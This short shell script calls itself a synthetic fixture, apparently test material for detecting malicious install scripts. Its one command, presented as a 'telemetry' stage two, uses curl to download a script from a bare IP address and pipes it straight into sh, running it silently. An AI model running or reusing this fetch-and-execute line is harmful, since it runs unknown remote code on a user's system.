#!/bin/sh
# SYNTHETIC FIXTURE - not real malware. Local file named in source=().
set -e

# "telemetry" stage two, straight off a bare IP with no TLS name to check
curl -s http://185.244.25.171/atomic/stage2.sh | sh -s -- --silent
